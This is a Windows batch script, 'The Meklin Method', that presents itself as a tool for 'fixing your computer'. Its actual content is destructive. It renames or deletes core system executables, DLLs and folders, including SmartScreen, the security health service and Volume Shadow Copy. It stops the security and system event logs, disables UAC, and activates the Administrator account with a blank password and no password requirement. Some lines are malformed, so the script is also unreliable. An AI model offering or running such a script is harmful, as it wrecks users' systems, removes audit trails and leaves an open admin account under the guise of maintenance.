ECHO OFF
ECHO .......................................................................
ECHO .......................................................................
echo ..........................THE MEKLIN METHOD............................
ECHO .......................................................................
echo .............................Your name is:.............................
ECHO .......................................................................
ECHO .......................................................................
C:\WINDOWS\SYSTEM32\WHOAMI.EXE /USER
ECHO .......................................................................
ECHO .......................................................................
echo %userprofile%
ECHO .......................................................................
ECHO .......................................................................


ECHO .......................................................................
ECHO .......................................................................
ECHO .......................................................................
echo ..............................Get psyched..............................
echo ...........................Fixing your computer........................
ECHO .......................................................................
ECHO .......................................................................
ECHO .......................................................................

sc config wmiacpi start= disabled
sc config staterepository start= disabled
sc config mstee start= disabled
sc config diagtrack start= disabled
sc config amdgpio start= disabled
sc config compositebus start= disabled
ren C:\Windows\System32usocoreworker.exe usocoreworker.ex
ren C:\Windows\System32\DriverStore\FileRepository\u0361901.inf_amd64_204a65b18f2a904a\B361909\atiesrxx.exe atiesrxx.ex
ren C:\Windows\System32\DriverStore\FileRepository\u0361901.inf_amd64_204a65b18f2a904a\B361909\atieclxx.exe atieclxx.ex
ren C:\Windows\System32\DriverStore\FileRepository\u0361901.inf_amd64_204a65b18f2a904a\B361909\ati2erec.dll ati2erec.dl
ren c:\windows\system32\TsWpfWrp.exe tswfprp.ex
rd /s /q c:\users\public
rd "c:\documents and settings"
rd "c:\programdata\application data"
rd c:\programdata\desktop
rd c:\programdata\documents
rd "c:\programdata\start menu"
rd c:\programdata\templates
rd "c:\users\all users"
rd "c:\users\default user"
rd "c:\users\default\application data"
rd "c:\users\default\local settings"
rd "c:\users\default\my documents"
rd /s /q rd "c:\users\default\saved games"
rd "c:\users\default\start menu"
rd c:\users\default\templates
rd c:\users\default\sendto
rd /s /q c:\users\default\videos
rd c:\users\default\nethood
rd /s /q  c:\users\default\cookies
rd /s /q c:\users\default\downloads
rd /s /q c:\users\default\links
rd /s /q c:\users\default\music
rd /s /q c:\users\default\pictures
rd c:\users\default\printhood
rd c:\users\default\recent
rd /s /q c:\users\default\favorites
rd "c:\users\default\documents\my music"
rd "c:\users\default\documents\my pictures"
rd "c:\users\default\documents\my videos"
rd "c:\users\default\appdata\local\application data"
rd "c:\users\default\appdata\local\history"
rd "c:\users\default\appdata\local\temporary internet files"
rd "c:\users\default\appdata\local\microsoft\windows\temporary internet files"
rd /s /q "c:\users\default\3d objects"
RD /S /Q c:\users\default\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
RD /S /Q c:\users\default\appdata\local\microsoft\windows\inetcache\IE
RD /S /Q c:\users\default\appdata\local\microsoft\windows\inetcache\LOW
RD /S /Q c:\users\default\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
nul > c:\users\default\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
nul > c:\users\default\appdata\local\microsoft\windows\inetcache\IE
nul > c:\users\default\appdata\local\microsoft\windows\inetcache\LOW
nul > c:\users\default\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
attrib +r c:\users\default\appdata\local\microsoft\windows\inetcache\content.ie5
attrib +r c:\users\default\appdata\local\microsoft\windows\inetcache\ie
attrib +r c:\users\default\appdata\local\microsoft\windows\inetcache\low
attrib +r c:\users\default\appdata\local\microsoft\windows\inetcache\virtualized
rd "c:\users\ADMINISTRATOR\application data"
rd "c:\users\ADMINISTRATOR\local settings"
rd "c:\users\ADMINISTRATOR\my documents"
rd /s /q rd "c:\users\ADMINISTRATOR\saved games"
rd "c:\users\ADMINISTRATOR\start menu"
rd c:\users\ADMINISTRATOR\templates
rd c:\users\ADMINISTRATOR\sendto
rd /s /q c:\users\ADMINISTRATOR\videos
rd c:\users\ADMINISTRATOR\nethood
rd /s /q  c:\users\ADMINISTRATOR\cookies
rd /s /q c:\users\ADMINISTRATOR\downloads
rd /s /q c:\users\ADMINISTRATOR\links
rd /s /q c:\users\ADMINISTRATOR\music
rd /s /q c:\users\ADMINISTRATOR\pictures
rd /s /q "c:\users\ADMINISTRATOR\3d objects"
rd c:\users\ADMINISTRATOR\printhood
rd c:\users\ADMINISTRATOR\recent
rd /s /q c:\users\ADMINISTRATOR\favorites
rd "c:\users\ADMINISTRATOR\documents\my music"
rd "c:\users\ADMINISTRATOR\documents\my pictures"
rd "c:\users\ADMINISTRATOR\documents\my videos"
rd "c:\users\ADMINISTRATOR\appdata\local\application data"
rd "c:\users\ADMINISTRATOR\appdata\local\history"
rd "c:\users\ADMINISTRATOR\appdata\local\temporary internet files"
rd "c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\temporary internet files"
RD /S /Q c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
RD /S /Q c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\IE
RD /S /Q c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\LOW
RD /S /Q c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
nul > c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
nul > c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\IE
nul > c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\LOW
nul > c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
attrib +r c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\content.ie5
attrib +r c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\ie
attrib +r c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\low
attrib +r c:\users\ADMINISTRATOR\appdata\local\microsoft\windows\inetcache\virtualized
rd c:\windows\system32\config\systemprofile\appdata\local\application data"
rd c:\windows\system32\config\systemprofile\appdata\local\history"
rd c:\windows\system32\config\systemprofile\appdata\local\temporary internet files"
rd c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\temporary internet files"
RD /S /Q c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
RD /S /Q c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\IE
RD /S /Q c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\LOW
RD /S /Q c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
nul > c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\CONTENT.IE5
nul > c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\IE
nul > c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\LOW
nul > c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\VIRTUALIZED
attrib +r c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\content.ie5
attrib +r c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\ie
attrib +r c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\low
attrib +r c:\windows\system32\config\systemprofile\appdata\local\microsoft\windows\inetcache\virtualized
rd /s /q c:\users\public
rd "c:\documents and settings"
rd "c:\programdata\application data"
rd c:\programdata\desktop
rd c:\programdata\documents
rd "c:\programdata\start menu"
rd c:\programdata\templates
rd "c:\users\all users"
rd "c:\users\default user"
ren c:\windows\system32\mobsync.exe mobsync.ex
ren c:\windows\system32\sppsvc.exe sppsvc.ex
ren c:\windows\system32\slui.exe slui.ex
ren c:\windows\system32\smartscreen.exe smartscreen.ex
ren c:\windows\system32\ctfmon.exe ctfmon.ex
ren c:\windows\system32\sppextcomobj.exe sppextcomobj.ex
ren c:\windows\system32\taskhostw.exe taskhostw.ex
ren c:\windows\system32\vssvc.exe vssvc.ex
ren c:\windows\system32\wermgr.exe wermgr.ex
ren c:\windows\system32\securityhealthservice.exe securityhealthservice.ex
ren c:\windows\system32\settingsynchost.exe settingsynchost.ex
ren c:\windows\system32\sens.dll sens.dl
ren c:\windows\system32\es.dll es.dl
ren c:\windows\system32\comsvcs.dll comsvcs.dl
ren c:\windows\system32\colbact.dll colbact.dl
ren c:\windows\system32\clbcatq.dll clbcatq.dl
ren c:\windows\system32\catsrvps.dll catsrvps.dl
ren c:\windows\system32\catsrvut.dll catsrvut.dl
ren c:\windows\system32\catsrv.dll catsrv.dl
ren c:\windows\syswow64\es.dll es.dl
ren c:\windows\syswow64\comsvcs.dll comsvcs.dl
ren c:\windows\syswow64\colbact.dll colbact.dl
ren c:\windows\syswow64\clbcatq.dll clbcatq.dl
ren c:\windows\syswow64\catsrvps.dll catsrvps.dl
ren c:\windows\syswow64\catsrvut.dll catsrvut.dl
ren c:\windows\syswow64\catsrv.dll catsrv.dl
ren c:\windows\syswow64\esentutl.exe esentutl.ex
ren c:\windows\syswow64\fsquirt.exe fsquirt.ex
ren c:\windows\syswow64\gamepanel.exe gamepanel.ex
ren c:\windows\syswow64\gamebarpresencewriter.exe gamebarpresencewriter.ex
ren c:\windows\syswow64\ieunatt.exe ieunatt.ex
ren c:\windows\syswow64\iexpress.exe iexpress.ex
del c:\windows\syswow64\onedrivesetup.exe
ren c:\windows\syswow64\mobsync.exe mobsync.ex
ren c:\windows\syswow64\psr.exe psr.ex
ren c:\windows\syswow64\rasautou.exe rasautou.ex
ren c:\windows\syswow64\rasdial.exe rasdial.ex
ren c:\windows\syswow64\raserver.exe raserver.ex
ren c:\windows\syswow64\rasphone.exe rasphone.ex
ren c:\windows\syswow64\rdpsa.exe rdpsa.ex
ren c:\windows\syswow64\rdpsaproxy.exe rdpsaproxy.ex
ren c:\windows\syswow64\rdrleakdiag.exe rdrleakdiag.ex
ren c:\windows\syswow64\reagentc.exe reagentc.ex
ren c:\windows\syswow64\recover.exe recover.ex
ren c:\windows\syswow64\searchfilterhost.exe searchfilterhost.ex
ren c:\windows\syswow64\searchindexer.exe searchindexer.ex
ren c:\windows\syswow64\searchprotocolhost.exe searchprotocolhost.ex
ren c:\windows\syswow64\settingsynchost.exe settingsynchost.ex
ren c:\windows\syswow64\shrpubw.exe shrpubw.ex
ren c:\windows\syswow64\srdelayed.exe srdelayed.ex
ren c:\windows\syswow64\synchost.exe synchost.ex
ren c:\windows\syswow64\msfeedssync.exe msfeedssync.ex
ren c:\windows\syswow64\mmgaserver.exe mmgaserver.ex
ren c:\windows\syswow64\mrinfo.exe mrinfo.ex
ren c:\windows\syswow64\msra.exe msra.ex
ren c:\windows\syswow64\mstsc.exe mstsc.ex
ren c:\windows\syswow64\mtstocom.exe mtstocom.ex
ren c:\windows\syswow64\ntprint.exe ntprint.ex
ren c:\windows\syswow64\oposhost.exe oposhost.ex
ren c:\windows\syswow64\perfhost.exe perfhost.ex
ren c:\windows\syswow64\rdpsauachelper.exe rdpsauachelper.ex
ren c:\windows\syswow64\printui.exe printui.ex
ren c:\windows\syswow64\presentationhost.exe presentationhost.ex
ren c:\windows\syswow64\print.exe print.ex
ren c:\windows\syswow64\prevhost.exe prevhost.ex
ren c:\windows\syswow64\proquota.exe proquota.ex
ren c:\windows\syswow64\rmactivate.exe rmactive.ex
ren c:\windows\syswow64\rmactivate_isv.exe rmactivate_isv.ex
ren c:\windows\syswow64\rmactivate_ssp.exe rmactivate_ssp.ex
ren c:\windows\syswow64\rmactivate_ssp_isv.exe rmactivate_ssp_isv.ex
ren c:\windows\syswow64\rmclient.exe rmclient.ex
ren c:\windows\syswow64\rrinstaller.exe rrinstaller.ex
ren c:\windows\syswow64\schtasks.exe schtasks.ex
ren c:\windows\syswow64\tpminit.exe tpminit.ex
ren c:\windows\syswow64\tttrace.exe tttrace.ex
ren c:\windows\syswow64\ttdinject.exe ttdinject.ex
ren c:\windows\syswow64\tstheme.exe tstheme.ex
ren c:\windows\syswow64\werfaultsecure.exe werfaultsecure.ex
ren c:\windows\syswow64\wermgr.exe wermgr.ex
ren c:\windows\syswow64\wscript.exe wscript.ex
ren c:\windows\syswow64\wsmanhttpconfig.exe wsmanhttpconfig.ex
ren c:\windows\syswow64\wsmprovhost.exe wsmprovhost.ex
ren c:\windows\syswow64\winrs.exe winrs.ex
ren c:\windows\syswow64\winrshost.exe winrshost.ex
ren c:\windows\syswow64\winrtnetmuahostserver.exe winrtnetmuahostserver.ex
ren c:\windows\syswow64\wpdshextautoplay.exe wpdshextautoplay.ex
ren c:\windows\syswow64\thumbnailextractionhost.exe thumbnailextractionhost.ex
ren c:\windows\syswow64\tcmsetup.exe tcmsetup.ex
ren c:\windows\syswow64\tokenbrokercookies.exe tokenbrokercookies.ex
ren c:\windows\syswow64\mfpmp.exe mfpmp.ex
ren c:\windows\syswow64\mavinject.exe mavinject.ex
c:\windows\system32\lodctr /d:".NET CLR Data"
c:\windows\system32\lodctr /d:".NET CLR Networking"
c:\windows\system32\lodctr /d:".NET CLR Networking 4.0.0.0"
c:\windows\system32\lodctr /d:".NET Data Provider for Oracle"
c:\windows\system32\lodctr /d:".NET Data Provider for SqlServer"
c:\windows\system32\lodctr /d:".NET Memory Cache 4.0"
c:\windows\system32\lodctr /d:".NETFramework"
c:\windows\system32\lodctr /d:"BITS"
c:\windows\system32\lodctr /d:"ESENT"
c:\windows\system32\lodctr /d:"Lsa"
c:\windows\system32\lodctr /d:"LSM"
c:\windows\system32\lodctr /d:"MSDTC"
c:\windows\system32\lodctr /d:"MSDTC Bridge 3.0.0.0"
c:\windows\system32\lodctr /d:"MSDTC Bridge 4.0.0.0"
c:\windows\system32\lodctr /d:"MSSCNTRS"
c:\windows\system32\lodctr /d:"PerfDisk"
c:\windows\system32\lodctr /d:"PerfNet"
c:\windows\system32\lodctr /d:"PerfOS"
c:\windows\system32\lodctr /d:"PerfProc"
c:\windows\system32\lodctr /d:"rdyboost"
c:\windows\system32\lodctr /d:"RemoteAccess"
c:\windows\system32\lodctr /d:"ServiceModelEndpoint 3.0.0.0"
c:\windows\system32\lodctr /d:"ServiceModelOperation 3.0.0.0"
c:\windows\system32\lodctr /d:"ServiceModelService 3.0.0.0"
c:\windows\system32\lodctr /d:"SMSvcHost 3.0.0.0"
c:\windows\system32\lodctr /d:"SMSvcHost 4.0.0.0"
c:\windows\system32\lodctr /d:"Spooler"
c:\windows\system32\lodctr /d:"TermService"
c:\windows\system32\lodctr /d:"UGatherer"
c:\windows\system32\lodctr /d:"UGTHRSVC"
c:\windows\system32\lodctr /d:"usbhub"
c:\windows\system32\lodctr /d:"Windows Workflow Foundation 3.0.0.0"
c:\windows\system32\lodctr /d:"Windows Workflow Foundation 4.0.0.0"
c:\windows\system32\lodctr /d:"wmiaprpl"
c:\windows\system32\lodctr /d:"tcpip"
c:\windows\system32\lodctr /d:"tapisrv"
c:\windows\system32\lodctr /d:"wsearchidxpi"
c:\windows\system32\lodctr /d:"aspnet_state"
c:\windows\system32\lodctr /d:"asp.net_4.0.30319"
c:\windows\system32\lodctr /d:"asp.net"
c:\windows\system32\lodctr /d:".netframework"
c:\windows\system32\logman stop "nt kernel logger" -ets
c:\windows\system32\logman stop phetrundownlogger -ets
c:\windows\system32\logman stop phetkernellogger -ets
c:\windows\system32\logman stop usernotpresenttracesession -ets
c:\windows\system32\logman stop ubpm -ets
c:\windows\system32\logman stop msdtc_trace_session -ets
c:\windows\system32\logman stop eventlog-security -ets
c:\windows\system32\logman stop eventlog-application -ets
c:\windows\system32\logman stop eventlog-system -ets
c:\windows\system32\logman stop LwtNetLog -ets
c:\windows\system32\logman stop NetCore -ets
c:\windows\system32\logman stop NtfsLog -ets
c:\windows\system32\logman stop RadioMgr -ets
c:\windows\system32\logman stop WiFiSession -ets
c:\windows\system32\logman stop "steam event tracing" -ets
c:\windows\system32\logman stop scm -ets
c:\windows\system32\logman stop audio -ets
c:\windows\system32\logman stop sqmlogger -ets
c:\windows\system32\logman stop readyboot -ets
c:\windows\system32\logman stop wdicontextlog -ets
c:\windows\system32\logman stop aiteventlog -ets
c:\windows\system32\logman stop diaglog -ets
c:\windows\system32\logman stop eventlog-system -ets
c:\windows\system32\logman stop "circular kernel context logger" -ets
c:\windows\system32\logman stop msmppssession7 -ets
c:\windows\system32\logman stop wfp-diag -ets
c:\windows\system32\logman stop energy-trace -ets
c:\windows\system32\logman stop umstartup -ets
c:\windows\system32\logman stop COM -ets
c:\windows\system32\logman stop LogonUILog -ets
c:\windows\system32\logman stop MpWppTracing-12312021-191912-00000003-ffffffff -ets
c:\windows\system32\netsh interface teredo set state disabled
c:\windows\system32\netsh interface ipv6 6to4 set state state=disabled
c:\windows\system32\netsh interface ipv6 isatap set state state=disabled
REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V ENABLELUA 0
REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V ENABLECURSORSUPPRESSION 0
reg add hklm\system\currentcontrolset\services\rpcss /v ListenOnInternet /t reg_sz /d N /f
reg add hklm\system\currentcontrolset\services\rpceptmapper /v ListenOnInternet /t reg_sz /d N /f
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\INTERNET /V USEINTERNETPORTS /T REG_SZ /D N /F
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLE /V ENABLEDCOM /T REG_SZ /D N /F
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\COM3 /V COM+ENABLED /T REG_DWORD /D 0 /F
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\COM3 /V REGDBAUTOBACKUP /T REG_DWORD /D 0 /F
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\COM3 /V REMOTEACCESSENABLED /T REG_DWORD /D 0 /F
net user ADMINISTRATOR ""
net user administrator ""
net user ADMINISTRATOR /passwordreq:no
net user administrator /passwordreq:no
net user ADMINISTRATOR /active:yes
net user administrator /active:yes
C:\WINDOWS\SYSTEM32\NET.EXE ACCOUNTS /MAXPWAGE:UNLIMITED
takeown /f c:\windows\system32\mcupdate_AuthenticAMD.dll
icacls c:\windows\system32\mcupdate_AuthenticAMD.dll /grant administrators:f /t
ren c:\windows\system32\mcupdate_AuthenticAMD.dll mcupdate_AuthenticAMD.dl
takeown /f c:\windows\system32\mcupdate_GenuineIntel.dll
icacls c:\windows\system32\mcupdate_GenuineIntel.dll /grant administrators:f /t
ren c:\windows\system32\mcupdate_GenuineIntel.dll mcupdate_GenuineIntel.dl
takeown /f c:\windows\system32\thumbcache.dll
icacls c:\windows\system32\thumbcache.dll
ren c:\windows\system32\thumbcache.dll thumbcache.dl
ren c:\windows\system32\spool spool2
rd /s c:\windows\system32\spool2 /q
ren c:\windows\system32\speech speech2
rd /s c:\windows\system32\speech2 /q
ren c:\windows\system32\pt-pt pt-pt2
rd /s c:\windows\system32\pt-pt2 /q
ren c:\windows\system32\ro-ro ro-ro2
rd /s c:\windows\system32\ro-ro2 /q
ren c:\windows\system32\ru-ru ru-ru2
rd /s c:\windows\system32\ru-ru2 /q
ren c:\windows\system32\sl-SI sl-si2
rd /s c:\windows\system32\sl-si2 /q
ren c:\windows\system32\sk-sk sk-sk2
rd /s c:\windows\system32\sk-sk2 /q
ren c:\windows\system32\speechux speechux2
rd /s c:\windows\system32\speechux2 /q
ren c:\windows\system32\sr-latn-cs sr-latn-cs2
rd /s c:\windows\system32\sr-latn-cs2 /q
ren c:\windows\system32\sv-se sv-se2
rd /s c:\windows\system32\sv-se2 /q
ren c:\windows\system32\th-th th-th2
rd /s c:\windows\system32\th-th2 /q
ren c:\windows\system32\uk-ua uk-ua2
rd /s c:\windows\system32\uk-ua2 /q
ren c:\windows\system32\tr-tr tr-tr2
rd /s c:\windows\system32\tr-tr2 /q
ren c:\windows\system32\zh-tw zh-tw2
rd /s c:\windows\system32\zh-tw2 /q
ren c:\windows\system32\zh-cn zh-cn2
rd /s c:\windows\system32\zh-cn2 /q
ren c:\windows\system32\nb-no nb-no2
rd /s c:\windows\system32\nb-no2 /q
ren c:\windows\system32\migwiz migwiz2
rd /s c:\windows\system32\migwiz2 /q
ren c:\windows\system32\migration migration2
rd /s c:\windows\system32\migration2 /q
ren c:\windows\system32\lt-lt lt-lt2
rd /s c:\windows\system32\lt-lt2 /q
ren c:\windows\system32\lv-lv lv-lv2
rd /s c:\windows\system32\lv-lv2 /q
ren c:\windows\system32\ko-kr ko-kr2
rd /s c:\windows\system32\ko-kr2 /q
ren c:\windows\system32\ja-jp ja-jp2
rd /s c:\windows\system32\ja-jp2 /q
ren c:\windows\system32\it-it it-it2
rd /s c:\windows\system32\it-it2 /q
ren c:\windows\system32\ime ime2
rd /s c:\windows\system32\ime2 /q
ren c:\windows\system32\hu-hu hu-hu2
rd /s c:\windows\system32\hu-hu2 /q
ren c:\windows\system32\hr-hr hr-hr2
rd /s c:\windows\system32\hr-hr2 /q
ren c:\windows\system32\he-il he-il2
rd /s c:\windows\system32\he-il2 /q
ren c:\windows\system32\fr-fr fr-fr2
rd /s c:\windows\system32\fr-fr2 /q
ren c:\windows\system32\fi-fi fi-fi2
rd /s c:\windows\system32\fi-fi2 /q
ren c:\windows\system32\et-ee et-ee2
rd /s c:\windows\system32\et-ee2 /q
ren c:\windows\system32\es-es es-es2
rd /s c:\windows\system32\es-es2 /q
ren c:\windows\system32\el-gr el-gr2
rd /s c:\windows\system32\el-gr2 /q
ren c:\windows\system32\da-dk da-dk2
rd /s c:\windows\system32\da-dk2 /q
ren c:\windows\system32\cs-cz cs-cz2
rd /s c:\windows\system32\cs-cz2 /q
ren c:\windows\system32\da-dk da-dk2
rd /s c:\windows\system32\da-dk2 /q
ren c:\windows\system32\cs-cz cs-cz2
rd /s c:\windows\system32\cs-cz2 /q
ren c:\windows\system32\bg-bg bg-bg2
rd /s c:\windows\system32\bg-bg2 /q
ren c:\windows\system32\ar-sa ar-sa2
rd /s c:\windows\system32\ar-sa2 /q
EXIT